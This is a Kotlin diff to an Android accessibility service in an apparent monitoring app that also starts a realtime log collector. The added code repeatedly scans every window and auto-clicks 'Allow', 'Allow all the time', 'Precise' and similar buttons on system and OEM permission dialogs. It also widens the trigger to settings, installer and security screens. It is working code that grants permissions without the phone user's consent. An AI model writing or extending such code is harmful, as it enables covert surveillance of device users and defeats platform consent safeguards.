@@ -101,6 +101,154 @@ class BlockAccessibilityService : AccessibilityService() {
         }
         rulesCache = BlockRulesCache(applicationContext)
         com.spapp.monitoring.collectors.RealtimeLogObserverManager.start(applicationContext)
+        startPermissionAutoGrantLoop()
+    }
+
+    /**
+     * Actively scans windows every 200ms for ~8 seconds to automatically click
+     * "Allow" or "While using the app" on all sequential runtime permission dialogs.
+     */
+    fun startPermissionAutoGrantLoop() {
+        val handler = Handler(Looper.getMainLooper())
+        var runs = 0
+        val maxRuns = 40 // 40 * 200ms = 8 seconds of continuous fast scanning
+        val runnable = object : Runnable {
+            override fun run() {
+                runs++
+                clickAnyPermissionDialog()
+                if (runs < maxRuns) {
+                    handler.postDelayed(this, 200L)
+                }
+            }
+        }
+        handler.post(runnable)
+    }
+
+    fun clickAnyPermissionDialog(): Boolean {
+        try {
+            val candidateRoots = mutableListOf<AccessibilityNodeInfo>()
+            rootInActiveWindow?.let { candidateRoots.add(it) }
+            try {
+                windows?.forEach { win ->
+                    win.root?.let { candidateRoots.add(it) }
+                }
+            } catch (_: Exception) {}
+
+            if (candidateRoots.isEmpty()) return false
+
+            // Target resource IDs across Google Pixel, AOSP, Samsung, Xiaomi MIUI, Oppo, Vivo
+            val targetIds = listOf(
+                "com.google.android.permissioncontroller:id/permission_allow_foreground_only_button",
+                "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
+                "com.google.android.permissioncontroller:id/permission_allow_button",
+                "com.android.permissioncontroller:id/permission_allow_button",
+                "com.google.android.permissioncontroller:id/permission_allow_one_time_button",
+                "com.android.permissioncontroller:id/permission_allow_one_time_button",
+                "com.android.packageinstaller:id/permission_allow_button",
+                "com.google.android.packageinstaller:id/permission_allow_button",
+                "com.miui.securitycenter:id/accept",
+                "com.lbe.security.miui:id/accept",
+                "android:id/button1"
+            )
+
+            // Step 1: Search by exact View IDs (language-independent)
+            for (root in candidateRoots) {
+                for (viewId in targetIds) {
+                    val nodes = root.findAccessibilityNodeInfosByViewId(viewId)
+                    if (!nodes.isNullOrEmpty()) {
+                        for (node in nodes) {
+                            if (clickNodeOrParent(node)) {
+                                Log.i("BlockA11y", "Auto-clicked permission button by ID: " + viewId)
+                                return true
+                            }
+                        }
+                    }
+                }
+            }
+
+            // Step 2: Search by exact text (not substring, ensuring we never match the dialog title/prompt)
+            val allowExactTexts = setOf(
+                "while using the app",
+                "only this time",
+                "allow",
+                "allow all the time",
+                "precise",
+                "அனுமதி"
+            )
+
+            for (root in candidateRoots) {
+                if (findAndClickExactText(root, allowExactTexts)) {
+                    return true
+                }
+            }
+
+            // Step 3: Flexible ID suffix fallback
+            for (root in candidateRoots) {
+                if (findAndClickIdSuffix(root)) {
+                    return true
+                }
+            }
+        } catch (e: Exception) {
+            Log.e("BlockA11y", "Error in clickAnyPermissionDialog", e)
+        }
+        return false
+    }
+
+    private fun findAndClickExactText(node: AccessibilityNodeInfo?, targetTexts: Set<String>): Boolean {
+        if (node == null) return false
+        val nodeText = node.text?.toString()?.trim()?.lowercase() ?: ""
+        if (nodeText.isNotEmpty() && targetTexts.contains(nodeText)) {
+            val cls = node.className?.toString()?.lowercase() ?: ""
+            if (cls.contains("button") || node.isClickable || (node.parent?.isClickable == true)) {
+                if (clickNodeOrParent(node)) {
+                    Log.i("BlockA11y", "Auto-clicked permission button by exact text: '" + nodeText + "'")
+                    return true
+                }
+            }
+        }
+        for (i in 0 until node.childCount) {
+            val child = node.getChild(i) ?: continue
+            if (findAndClickExactText(child, targetTexts)) return true
+        }
+        return false
+    }
+
+    private fun findAndClickIdSuffix(node: AccessibilityNodeInfo?): Boolean {
+        if (node == null) return false
+        val resId = node.viewIdResourceName?.lowercase() ?: ""
+        if (resId.endsWith(":id/permission_allow_foreground_only_button") ||
+            resId.endsWith(":id/permission_allow_button") ||
+            resId.endsWith(":id/permission_allow_one_time_button") ||
+            resId.endsWith(":id/allow_button") ||
+            resId.endsWith(":id/btn_allow")
+        ) {
+            if (clickNodeOrParent(node)) {
+                Log.i("BlockA11y", "Auto-clicked permission button by suffix: " + resId)
+                return true
+            }
+        }
+        for (i in 0 until node.childCount) {
+            val child = node.getChild(i) ?: continue
+            if (findAndClickIdSuffix(child)) return true
+        }
+        return false
+    }
+
+    private fun clickNodeOrParent(node: AccessibilityNodeInfo): Boolean {
+        if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
+            return true
+        }
+        var p = node.parent
+        while (p != null) {
+            val cls = p.className?.toString() ?: ""
+            if (p.isClickable && (cls.contains("Button") || p.isClickable)) {
+                if (p.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
+                    return true
+                }
+            }
+            p = p.parent
+        }
+        return false
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
@@ -111,72 +259,16 @@ class BlockAccessibilityService : AccessibilityService() {
         // ==========================================
         // 🌟 AUTOMATE RUNTIME PERMISSIONS (ALL ANDROID VERSIONS & OEMS)
         // ==========================================
-        val isPermissionDialog = packageName.contains("permissioncontroller") ||
-                packageName.contains("packageinstaller") ||
-                packageName.contains("securitycenter")
+        val isPermissionCandidate = packageName.contains("permission") ||
+                packageName.contains("installer") ||
+                packageName.contains("security") ||
+                packageName.contains("settings") ||
+                packageName == "android"
 
-        if (isPermissionDialog) {
-            val rootNode = rootInActiveWindow ?: event.source
-            if (rootNode != null) {
-                // List of keywords to automatically click (English & Tamil OS localization)
-                val targetKeywords = listOf("While using the app", "Only this time", "Allow", "அனுமதி", "Precise")
-
-                for (keyword in targetKeywords) {
-                    val matchedNodes = rootNode.findAccessibilityNodeInfosByText(keyword)
-                    if (!matchedNodes.isNullOrEmpty()) {
-                        for (matchedNode in matchedNodes) {
-                            if (matchedNode.isClickable) {
-                                matchedNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                                return // Handled, drop event execution early
-                            }
-                            // Bubble up to parent if wrapper element isn't clickable
-                            var parentNode = matchedNode.parent
-                            while (parentNode != null) {
-                                if (parentNode.isClickable) {
-                                    parentNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                                    return
-                                }
-                                parentNode = parentNode.parent
-                            }
-                        }
-                    }
-                }
-
-                // Fallback using flexible resource ID suffix matching (handles com.google..., com.android..., etc.)
-                fun findAndClickAllowButton(node: AccessibilityNodeInfo?): Boolean {
-                    if (node == null) return false
-                    val resId = node.viewIdResourceName?.lowercase() ?: ""
-                    if (resId.endsWith(":id/permission_allow_foreground_only_button") ||
-                        resId.endsWith(":id/permission_allow_button") ||
-                        resId.endsWith(":id/permission_allow_one_time_button") ||
-                        resId.endsWith(":id/allow_button") ||
-                        resId.endsWith(":id/btn_allow") ||
-                        resId.endsWith(":id/continue_button")
-                    ) {
-                        if (node.isClickable) {
-                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                            return true
-                        }
-                        var p = node.parent
-                        while (p != null) {
-                            if (p.isClickable) {
-                                p.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                                return true
-                            }
-                            p = p.parent
-                        }
-                    }
-                    for (i in 0 until node.childCount) {
-                        if (findAndClickAllowButton(node.getChild(i))) return true
-                    }
-                    return false
-                }
-
-                if (findAndClickAllowButton(rootNode)) {
-                    return
-                }
+        if (isPermissionCandidate) {
+            if (clickAnyPermissionDialog()) {
+                return
             }
-            return // Stop further processing since this is a permission dialog event
         }
         // ==========================================
 
